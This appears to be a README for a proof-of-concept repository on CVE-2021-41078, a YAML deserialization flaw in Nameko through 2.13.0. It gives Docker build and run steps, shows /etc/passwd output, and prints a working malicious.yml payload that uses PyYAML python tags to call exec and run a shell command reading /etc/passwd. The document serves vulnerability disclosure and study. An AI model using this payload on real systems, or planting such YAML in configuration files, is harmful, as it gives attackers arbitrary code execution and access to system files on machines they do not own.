# CVE-2021-41078
nameko Arbitrary code execution due to YAML deserialization

## NVD Description

Nameko through 2.13.0 can be tricked into performing arbitrary code execution when deserializing the config file.

## Demo

![cve-2021-41078](https://user-images.githubusercontent.com/56715563/187062984-fb0c5149-92a6-4440-8731-6260465bfc2a.gif)

## Set Up

1. Build an image from a Dockerfile

```
docker build -t cve-2021-41078 .
```

2. Run python main.py in a new container

```
docker run -it --rm cve-2021-41078
```

output /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-- snip --
```

![output-image](https://user-images.githubusercontent.com/56715563/187062786-f420ceb8-e8be-42ee-989e-b657ede803a1.png)

## PoC Payload

malicious.yml
```
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "__import__('os').system('cat /etc/passwd')"
```

## Reference

- https://github.com/nameko/nameko/security/advisories/GHSA-6p52-jr3q-c94g
